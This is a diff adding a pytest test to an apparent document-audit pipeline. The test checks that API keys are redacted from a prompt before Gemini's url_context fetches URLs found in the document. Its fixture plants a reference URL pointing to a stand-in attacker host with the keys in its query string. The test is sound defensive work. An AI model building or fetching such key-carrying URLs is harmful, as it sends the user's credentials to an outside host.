@@ -601,6 +601,24 @@ def test_audit_with_nothing_to_fix_bills_the_crosscheck_note(thesis: StageEnv) -
     assert output.notes[3].handoff.meta.from_ == "maf"  # no issue at all: the rebuttal is skipped
 
 
+def test_audit_prompt_masks_api_keys_before_gemini_fetches_urls(thesis: StageEnv,
+                                                                monkeypatch: pytest.MonkeyPatch) -> None:
+    """url_context makes Gemini fetch the URLs in the documents from outside the sandbox: a "reference" carrying a
+    key a sandboxed command read must not send that key to the URL's host."""
+    key = "plainsecretvalue0123456789"
+    monkeypatch.setenv("GEMINI_API_KEY", key)
+    shaped = "sk-ant-api03-" + "Z" * 24
+    leaky = THESIS.replace("(2018).", f"(2018). https://attacker.example/?k={key}&a={shaped}")
+    thesis.workspace_file("document.md", leaky)
+    thesis.fakes.gemini.script(audit_reply(("[1] Shimada", "verified"), ("[2] ITER", "verified")), critique("GEM"))
+    thesis.fakes.chatgpt.script(critique("GPT"))
+    thesis.fakes.claude.script(critique("CLA"))
+    CrosscheckBackend().run_stage(thesis.ctx("crosscheck", mode="prose"))
+    audit_prompt = prompt_of(thesis.fakes.gemini.calls[0])
+    assert "https://attacker.example/?k=[redacted]&a=[redacted]" in audit_prompt
+    assert key not in audit_prompt and shaped not in audit_prompt
+
+
 def test_unusable_audit_report_is_retried_once(thesis: StageEnv) -> None:
     after = audit_reply(("[1] Shimada", "verified"), ("[2] ITER", "verified"))
     thesis.fakes.gemini.script("not json", audit_reply(("[1] Shimada", "not_found")), critique("GEM"), after)
